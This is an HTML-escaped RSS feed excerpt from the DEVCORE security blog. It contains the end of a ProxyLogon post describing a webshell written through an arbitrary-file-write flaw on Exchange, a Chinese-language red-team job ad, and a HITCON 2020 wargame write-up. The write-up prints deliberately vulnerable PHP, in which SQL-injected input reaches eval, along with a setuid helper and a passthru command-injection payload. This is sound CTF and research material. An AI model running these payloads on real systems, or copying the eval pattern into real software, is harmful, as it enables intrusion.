    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There are several paths to trigger the vulnerability of arbitrary-file-write. Here we use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ResetOABVirtualDirectory.xaml&lt;/code&gt; as an example and write the result of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Set-OABVirtualDirectory&lt;/code&gt; to the webroot to be our Webshell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we have a working pre-auth RCE exploit chain. An unauthenticated attacker can execute arbitrary commands on Microsoft Exchange Server through an exposed 443 port. Here is an &lt;a href=&quot;https://www.youtube.com/watch?v=SvjGMo9aMwE&quot;&gt;demonstration video&lt;/a&gt;:&lt;/p&gt;

&lt;div style=&quot;text-align: center;&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/SvjGMo9aMwE&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;&lt;/div&gt;

&lt;h1 id=&quot;epilogue&quot;&gt;Epilogue&lt;/h1&gt;

&lt;p&gt;As the first blog of this series, ProxyLogon perfectly shows how severe this attack surface could be. We will have more examples to come. Stay tuned!&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon/</link>
                <guid>https://devco.re/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon</guid>
                <pubDate>Fri, 06 Aug 2021 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>[已結束] DEVCORE 徵求紅隊演練工程師</title>
                <description>&lt;p&gt;戴夫寇爾已成立近九年，過去我們不斷地鑽研進階攻擊技巧，為許多客戶提供高品質的滲透測試服務，也成為客戶最信賴的資安伙伴之一。在 2017 年我們更成為第一個在台灣推出紅隊演練服務的本土廠商，透過無所不用其極的駭客思維，陸續為電子商務、政府部門、金融業者執行最真實且全面的攻擊演練，同時也累積了豐富的經驗與案例，成為台灣紅隊演練實力最深厚的服務供應商。&lt;/p&gt;

&lt;p&gt;隨著公司規模擴大，我們首度公開招募紅隊演練人才，希望能夠找到一至兩位 Support 紅隊演練工程師，擴大我們的後勤能量，鞏固戴夫寇爾的團隊作戰能力，讓我們持續為企業提供最優異的資安服務。&lt;/p&gt;

&lt;p&gt;我們非常渴望您的加入，若您有意成為戴夫寇爾的一員，可參考下列職缺細節：&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;工作內容&quot;&gt;工作內容&lt;/h3&gt;

&lt;p&gt;在滲透測試、紅隊演練專案中擔任重要的後勤工作。這會是最清楚全局戰況的角色，需要觀察、記錄整體戰況，細心且耐心地整理繁雜的戰局資訊，並且樂於與作戰夥伴溝通現有戰況。檢測結束後需要將完整的戰況資訊和檢測過程中發現的弱點彙整成報告和簡報，讓客戶清楚理解弱點技術細節與成因，且可依據技術細節重現已發現的弱點，最後協助檢測客戶的修補狀況。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;協助作戰 40%
    &lt;ul&gt;
      &lt;li&gt;整合作戰資料，關聯戰場資訊協助隊友找到突破點&lt;/li&gt;
      &lt;li&gt;追蹤掌握戰況進度&lt;/li&gt;
      &lt;li&gt;專案中與客戶協調雙方需求&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;會議 10%
    &lt;ul&gt;
      &lt;li&gt;參與專案相關啟動、結案會議&lt;/li&gt;
      &lt;li&gt;成果簡報&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;撰寫與製作報告文件 40%
    &lt;ul&gt;
      &lt;li&gt;製作報告書、簡報、日誌&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;檢測 (初測、複測) 10%
    &lt;ul&gt;
      &lt;li&gt;檢測弱點修補&lt;/li&gt;
      &lt;li&gt;複測時程安排與協調&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;工作時間&quot;&gt;工作時間&lt;/h3&gt;
&lt;p&gt;10:00 - 18:00 (中間休息 1 小時 13:00 - 14:00)&lt;/p&gt;

&lt;h3 id=&quot;工作地點&quot;&gt;工作地點&lt;/h3&gt;
&lt;p&gt;台北市中山區復興北路 168 號 10 樓
近期會搬遷至台北田徑場附近（捷運台北小巨蛋站）&lt;/p&gt;

&lt;h3 id=&quot;工作條件要求&quot;&gt;工作條件要求&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;熟悉 OWASP Web Top 10。&lt;/li&gt;
  &lt;li&gt;熟悉 Microsoft Word 或 Mac Pages。&lt;/li&gt;
  &lt;li&gt;熟悉 Microsoft PowerPoint 或 Mac Keynote。&lt;/li&gt;
  &lt;li&gt;熟悉 BurpSuite 或其他 HTTP 封包修改攔截工具。&lt;/li&gt;
  &lt;li&gt;具有程式 Debug 能力，能重現並收斂問題。&lt;/li&gt;
  &lt;li&gt;熟悉網頁程式語言（如 PHP、ASPX、JSP），曾建立自己或別人常用的網頁服務。&lt;/li&gt;
  &lt;li&gt;熟悉 Scripting 語言（如 ShellScript、Python、Ruby），使用腳本輔以工作，亦能理解專案所用的相關腳本。&lt;/li&gt;
  &lt;li&gt;熟悉 Command Line 操作輔以工作，包含執行 Unix-like 和 Windows 的系統指令、工具等，亦能理解專案所用的相關指令。&lt;/li&gt;
  &lt;li&gt;熟悉 curl、netcat、nmap、Dirb 等安全測試相關工具。&lt;/li&gt;
  &lt;li&gt;有信心到職一年內拿到 Offensive Security Certified Professional (OSCP) 證照或擁有等值能力。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;人格特質偏好&quot;&gt;人格特質偏好&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;優秀的文字組織能力與邏輯思考，懂得透過淺顯易懂且條理清晰的方式傳達內容給客戶或內部團隊。&lt;/li&gt;
  &lt;li&gt;擁有強大的學習能力，對於任何不懂的技術細節都能主動詢問同事，想辦法理解並內化成自己的知識。&lt;/li&gt;
  &lt;li&gt;懂得溝通傾聽，能同理他人，找出彼此共識。&lt;/li&gt;
  &lt;li&gt;細心嚴謹，能耐心的處理繁瑣的庶務工作。&lt;/li&gt;
  &lt;li&gt;主動積極，看到我們沒發現的細節，超越我們所期望的基準。&lt;/li&gt;
  &lt;li&gt;良好的時間管理能力，依據任務的優先順序，有效率的完成每項交辦。&lt;/li&gt;
  &lt;li&gt;在各種工作細節中，找到最佳化流程的方式，幫助團隊更有效率的運作。&lt;/li&gt;
  &lt;li&gt;勇於接受挑戰且具備解決問題的能力，努力克服未知的難題。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;加分條件&quot;&gt;加分條件&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;曾經有撰寫過相關紅隊演練、滲透測試中、英文報告等經驗。&lt;/li&gt;
  &lt;li&gt;已考過 Offensive Security Certified Professional (OSCP) 證照。&lt;/li&gt;
  &lt;li&gt;曾經挖掘常見漏洞（如 XSS、SQL Injection、Broken Access Control）。&lt;/li&gt;
  &lt;li&gt;曾經寫過相關 CTF、Wargame 或弱點回報等類型的 Writeup。&lt;/li&gt;
  &lt;li&gt;有撰寫技術類型等文章部落格經驗。&lt;/li&gt;
  &lt;li&gt;具有專案管理規劃的能力。&lt;/li&gt;
  &lt;li&gt;中文盲打具備 TQC 專業級水準。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;工作環境&quot;&gt;工作環境&lt;/h3&gt;
&lt;p&gt;新辦公室裝潢中，可參考之前的&lt;a href=&quot;https://devco.re/blog/2019/07/23/devcore-201907-recruit/&quot;&gt;徵才文&lt;/a&gt;，未來辦公室會優於過去。&lt;/p&gt;

&lt;h3 id=&quot;公司福利&quot;&gt;公司福利&lt;/h3&gt;
&lt;p&gt;我們注重公司每位同仁的身心健康，請參考以下福利制度：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;休假福利
    &lt;ul&gt;
      &lt;li&gt;到職即可預支當年度特休&lt;/li&gt;
      &lt;li&gt;每年五天全薪病假&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;獎金福利
    &lt;ul&gt;
      &lt;li&gt;三節禮金（春節、端午節、中秋節）&lt;/li&gt;
      &lt;li&gt;生日禮金&lt;/li&gt;
      &lt;li&gt;婚喪補助&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;休閒福利
    &lt;ul&gt;
      &lt;li&gt;員工旅遊&lt;/li&gt;
      &lt;li&gt;舒壓按摩&lt;/li&gt;
      &lt;li&gt;Team Building&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;美食福利
    &lt;ul&gt;
      &lt;li&gt;零食飲料&lt;/li&gt;
      &lt;li&gt;員工聚餐&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;健康福利
    &lt;ul&gt;
      &lt;li&gt;員工健康檢查&lt;/li&gt;
      &lt;li&gt;運動中心健身券&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;進修福利
    &lt;ul&gt;
      &lt;li&gt;內部教育訓練&lt;/li&gt;
      &lt;li&gt;外部進修課程&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;其他
    &lt;ul&gt;
      &lt;li&gt;專業的公司團隊&lt;/li&gt;
      &lt;li&gt;扁平的內部組織&lt;/li&gt;
      &lt;li&gt;順暢的溝通氛圍&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;起薪範圍&quot;&gt;起薪範圍&lt;/h3&gt;
&lt;p&gt;新台幣 60,000 - 80,000 （保證年薪 14 個月）&lt;/p&gt;

&lt;h3 id=&quot;應徵方式&quot;&gt;應徵方式&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;請將您的履歷以 PDF 格式寄到 recruiting@devco.re
    &lt;ul&gt;
      &lt;li&gt;履歷格式請參考範例示意（&lt;a href=&quot;/assets/files/recruit/Resume_Example.docx&quot;&gt;DOCX&lt;/a&gt;、&lt;a href=&quot;/assets/files/recruit/Resume_Example.pages&quot;&gt;PAGES&lt;/a&gt;、&lt;a href=&quot;/assets/files/recruit/Resume_Example.pdf&quot;&gt;PDF&lt;/a&gt;）並轉成 PDF。若您有自信，也可以自由發揮最能呈現您能力的履歷。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;標題格式：&lt;strong&gt;[應徵] 紅隊演練工程師 您的姓名&lt;/strong&gt;（範例：[應徵] 紅隊演練工程師 王小美）&lt;/li&gt;
  &lt;li&gt;履歷內容請務必控制在兩頁以內，至少需包含以下內容：
    &lt;ul&gt;
      &lt;li&gt;基本資料&lt;/li&gt;
      &lt;li&gt;學歷&lt;/li&gt;
      &lt;li&gt;工作經歷&lt;/li&gt;
      &lt;li&gt;社群活動經歷&lt;/li&gt;
      &lt;li&gt;特殊事蹟&lt;/li&gt;
      &lt;li&gt;MBTI 職業性格測試結果（&lt;a href=&quot;https://www.apesk.com/mbti/dati_tw.asp&quot;&gt;測試網頁&lt;/a&gt;）&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;附註&quot;&gt;附註&lt;/h3&gt;

&lt;p&gt;我們會在兩週內主動與您聯繫，招募過程依序為書面審核、線上測驗以及面試三個階段。第二階段的線上測驗最快將於七月底進行，煩請耐心等候；第三階段面試視疫情狀況可能會採線上面試。
若有應徵相關問題，請一律使用 Email 聯繫，造成您的不便請見諒。我們感謝您的來信，期待您的加入！&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2021/06/22/devcore-202106-recruit/</link>
                <guid>https://devco.re/blog/2021/06/22/devcore-202106-recruit</guid>
                <pubDate>Tue, 22 Jun 2021 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE Wargame at HITCON 2020</title>
                <description>&lt;style type=&quot;text/css&quot;&gt;
    table {
        display: block;
        width: 100%;
        overflow: auto;
        word-break: normal;
        word-break: keep-all;
        font-size: smaller;
    }

    table th {
        font-weight: bold
    }

    table th,
    table td {
        padding: 5px 11px;
        border: 1px solid #ddd;
    }

    table tr {
        background-color: #fff;
        border-top: 1px solid #ccc;
    }

    table tr:nth-child(2n) {
        background-color: #f8f8f8;
    }
&lt;/style&gt;

&lt;p&gt;搭晚安～一年一度的資安圈大拜拜活動之一 HITCON 2020 在約一個月前順利落幕啦，今年我們照舊在攤位準備了幾道小小的 Wargame 給會眾朋友們挑戰自身技術，並同樣準備了幾份精美小禮物送給挑戰成功的朋友們。&lt;/p&gt;

&lt;p&gt;總計活動兩天間有登入並提交至少一把 flag 的人數為 92 人，非常感謝大家踴躍地參與，這次未能成功在時間內完成挑戰而未領到小禮物的朋友們也別太灰心，為了能更多的回饋社群，所以我們決定寫一篇技術文章介紹本次 Wargame 的其中一道開放式題目&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sqltest&lt;/code&gt;，為此我們在活動後詢問了所有解題的人，收集了大家的解法與思路，並將在文章的接下來一一為大家介紹！&lt;/p&gt;

&lt;h2 id=&quot;sqltest-題目說明&quot;&gt;sqltest 題目說明&lt;/h2&gt;

&lt;p&gt;這道題目主要核心的部分就這 3 個檔案：Dockerfile、readflag.c 和 index.php。讓我們先看看前兩個檔案，可以從下方的 Dockerfile 中先觀察到 flag 被放置在檔案 /flag 之中，但權限被設定為僅有 root 可以讀取，另外準備了具有 setuid 權限的執行檔 /readflag，讓任何人均可在執行此檔案時偽裝成 root 身分，而 /readflag 的原始碼就如下方 readflag.c 所示，很單純的讀取並輸出 /flag 檔案內容，這個配置就是一個很標準以 getshell 為目標的 Wargame 題目。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Dockerfile&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-dockerfile highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; php:7.4.10-apache&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# setup OS env&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;apt update &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;docker-php-ext-install mysqli
&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;docker-php-ext-enable mysqli

&lt;span class=&quot;c&quot;&gt;# setup web application&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;COPY&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; ./src/ /var/www/html/&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# setup flag&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;DEVCORE{flag}&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /flag
&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;0400 /flag
&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chown &lt;/span&gt;root:root /flag
&lt;span class=&quot;k&quot;&gt;COPY&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; readflag.c /readflag.c&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;gcc &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /readflag /readflag.c
&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;4555 /readflag
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;readflag.c&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;seteuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;setegid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;setuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;setgid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/cat /flag&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;上述前半部為環境的佈置，真正題目的開始則要見下方 index.php，其中 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$_REQUEST&lt;/code&gt; 是我們可以任意控制的參數，題目除了 isset 外並無其他任何檢查，隨後第 8 行中參數被帶入 SQL 語句作執行，如果 SQL 執行成功並且有查詢到資料，就會進入 15 行開始的處理，來自 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$_REQUEST&lt;/code&gt; 的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$column&lt;/code&gt; 變數再次被使用並傳入 eval 作執行，這樣看下來題目的解題思路就很清楚了，我們需要構造一個字串，同時為合法的 SQL 語句與 PHP 語句，讓 SQL 執行時有回傳值且 PHP 執行時能夠執行任意系統指令，就能 getshell 並呼叫 /readflag 取得 flag！&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;index.php&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;column&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;No input&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$column&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;column&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;select &quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$column&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; from mytable where id =&apos;&quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&apos;&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysqli_connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;mysql&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;youtu.be/l11uaEjA-iI&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;sqltest&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mysqli_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mysqli_num_rows&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mysqli_fetch_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;output = &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;row-&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$column&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Database error&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;出題者解法&quot;&gt;出題者解法&lt;/h2&gt;

&lt;p&gt;身為出題者，當然必須先拋磚一下才能夠引玉～&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;exploit:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column={passthru(&apos;/readflag&apos;)}&amp;amp;id=1

SQL: SELECT {passthru(&apos;/readflag&apos;)} FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;{passthru(&apos;/readflag&apos;)};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

